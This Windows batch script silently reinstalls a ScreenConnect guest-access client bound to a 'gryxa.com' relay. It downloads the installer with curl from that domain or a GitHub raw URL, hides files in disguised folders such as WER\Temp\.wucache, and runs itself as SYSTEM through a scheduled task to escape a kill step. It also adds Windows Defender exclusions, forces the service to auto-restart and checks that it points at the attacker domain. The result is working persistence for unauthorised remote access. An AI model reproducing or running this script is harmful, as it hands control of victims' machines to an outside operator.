@echo off
rem GRYXA_CLEAN_INSTALL R1 - manual sevrz one-shot (keeps NO_INSTALL for mon; fleet via PUSH-CLEAN)
rem 1) uninstall Gryxa FP + leftovers only (never sevrz keepers)
rem 2) install from ui.gryxa.com, else repo MSI, else local cache
rem 3) verify RUNNING + gryxa.com ImagePath
rem 4) reboot ONCE (marker file) then exit
setlocal EnableExtensions EnableDelayedExpansion

set "WD=C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache"
set "STAGE=%SystemRoot%\Temp\.upd"
set "CURL=%SystemRoot%\System32\curl.exe"
set "FP=36e506ff016b2151"
set "KEEP=5f6010579852e507"
set "ALT=f861c8140d453427"
set "PC={9D7CC418-A356-9693-DCC5-41EC44D03B31}"
set "PACKED=814CC7D9653A3969CD5C14CE440DB313"
set "SVC=ScreenConnect Client (%FP%)"
set "DIR86=%ProgramFiles(x86)%\ScreenConnect Client (%FP%)"
set "DIR64=%ProgramFiles%\ScreenConnect Client (%FP%)"
set "MSI=%STAGE%\pkg_gryxa_clean.msi"
set "URL_UI=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "URL_REPO=https://raw.githubusercontent.com/xnobuddy/github-drop/main/pkg_gryxa.msi"
set "LOG=%WD%\gryxa_clean_install.log"
set "REBOOT_MARK=%WD%\gryxa_clean_rebooted.flag"
set "TASK=WucacheGryxaCleanInstall"
set "WORKER=%STAGE%\gryxa_clean_worker.cmd"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1

echo [%DATE% %TIME%] clean_install_queue host=%COMPUTERNAME%>>"%LOG%"

rem Detach past sevrz 10s Guest kill
if /I not "%~1"=="_RUN" (
  > "%WORKER%" (
    echo @echo off
    echo call "%~f0" _RUN
    echo schtasks /Delete /TN "%TASK%" /F
  )
  schtasks /Delete /TN "%TASK%" /F >nul 2>&1
  schtasks /Create /TN "%TASK%" /TR "cmd.exe /c %WORKER%" /SC MINUTE /MO 60 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
  schtasks /Run /TN "%TASK%" >nul 2>&1
  if errorlevel 1 (
    powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "Start-Process cmd.exe -ArgumentList '/c','%~f0 _RUN' -WindowStyle Hidden" >nul 2>&1
  )
  echo QUEUED clean-install - wait ~3-5 min then check service; reboot may follow
  echo LOG %LOG%
  endlocal & exit /b 0
)

echo [%DATE% %TIME%] clean_install_begin>>"%LOG%"

rem --- refuse if this would hit a keeper service name (paranoia) ---
if /I "%FP%"=="%KEEP%" goto :Fail
if /I "%FP%"=="%ALT%" goto :Fail

rem --- 1) uninstall Gryxa only ---
echo [%DATE% %TIME%] step_uninstall>>"%LOG%"
sc stop "%SVC%" >nul 2>&1
timeout /t 5 /nobreak >nul
msiexec /x %PC% /qn /norestart REBOOT=ReallySuppress >>"%LOG%" 2>&1
timeout /t 5 /nobreak >nul
sc stop "%SVC%" >nul 2>&1
sc delete "%SVC%" >nul 2>&1

rem purge phantom Installer Products (L34)
reg delete "HKLM\SOFTWARE\Classes\Installer\Products\%PACKED%" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\%PACKED%" /f >nul 2>&1
reg delete "HKCR\Installer\Products\%PACKED%" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\%PC%" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\%PC%" /f >nul 2>&1

if exist "%DIR86%" rmdir /s /q "%DIR86%" >nul 2>&1
if exist "%DIR64%" rmdir /s /q "%DIR64%" >nul 2>&1

rem never touch keeper dirs
sc query "ScreenConnect Client (%KEEP%)" >nul 2>&1
sc query "ScreenConnect Client (%ALT%)" >nul 2>&1

rem --- 2) fetch MSI: UI -> repo -> local caches ---
echo [%DATE% %TIME%] step_fetch>>"%LOG%"
del /f /q "%MSI%" "%MSI%.tmp" >nul 2>&1

"%CURL%" -L --ssl-no-revoke --connect-timeout 20 --max-time 180 -o "%MSI%.tmp" "%URL_UI%" >>"%LOG%" 2>&1
if exist "%MSI%.tmp" for %%F in ("%MSI%.tmp") do if %%~zF GTR 1000000 move /y "%MSI%.tmp" "%MSI%" >nul 2>&1

if not exist "%MSI%" (
  echo [%DATE% %TIME%] fetch_repo>>"%LOG%"
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 --max-time 180 -o "%MSI%.tmp" "%URL_REPO%" >>"%LOG%" 2>&1
  if exist "%MSI%.tmp" for %%F in ("%MSI%.tmp") do if %%~zF GTR 1000000 move /y "%MSI%.tmp" "%MSI%" >nul 2>&1
)

if not exist "%MSI%" if exist "%STAGE%\pkg_gryxa.msi" for %%F in ("%STAGE%\pkg_gryxa.msi") do if %%~zF GTR 1000000 copy /y "%STAGE%\pkg_gryxa.msi" "%MSI%" >nul 2>&1
if not exist "%MSI%" if exist "%WD%\pkg_gryxa.msi" for %%F in ("%WD%\pkg_gryxa.msi") do if %%~zF GTR 1000000 copy /y "%WD%\pkg_gryxa.msi" "%MSI%" >nul 2>&1

if not exist "%MSI%" (
  echo [%DATE% %TIME%] FAIL msi_unavailable>>"%LOG%"
  endlocal & exit /b 2
)
for %%F in ("%MSI%") do echo [%DATE% %TIME%] msi_ok size=%%~zF>>"%LOG%"

rem --- 3) install ---
echo [%DATE% %TIME%] step_install>>"%LOG%"
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.ClientService.exe" /t REG_DWORD /d 0 /f >nul 2>&1

msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_gryxa_clean.log"
set "MSIEXIT=!ERRORLEVEL!"
echo [%DATE% %TIME%] msiexec_exit=!MSIEXIT!>>"%LOG%"

sc config "%SVC%" start= auto >nul 2>&1
sc failure "%SVC%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%SVC%" >nul 2>&1
timeout /t 15 /nobreak >nul
sc start "%SVC%" >nul 2>&1
timeout /t 10 /nobreak >nul

rem --- 4) verify ---
sc query "%SVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
if errorlevel 1 (
  echo [%DATE% %TIME%] FAIL service_not_running>>"%LOG%"
  endlocal & exit /b 3
)
reg query "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
if errorlevel 1 (
  echo [%DATE% %TIME%] FAIL no_gryxa_in_imagepath>>"%LOG%"
  endlocal & exit /b 4
)

echo [%DATE% %TIME%] VERIFY_OK running+gryxa.com>>"%LOG%"

rem keep mon frozen
if not exist "%WD%\no_install.flag" (
  > "%WD%\no_install.flag" echo NO_INSTALL manual clean-install done - mon stays frozen
)

rem --- 5) reboot once ---
if exist "%REBOOT_MARK%" (
  echo [%DATE% %TIME%] reboot_already_done skip>>"%LOG%"
  endlocal & exit /b 0
)
echo %DATE% %TIME% >"%REBOOT_MARK%"
echo [%DATE% %TIME%] reboot_once scheduled>>"%LOG%"
shutdown /r /t 45 /c "Gryxa clean install OK - one reboot" /f
endlocal & exit /b 0

:Fail
echo [%DATE% %TIME%] FAIL bad_fp>>"%LOG%"
endlocal & exit /b 9
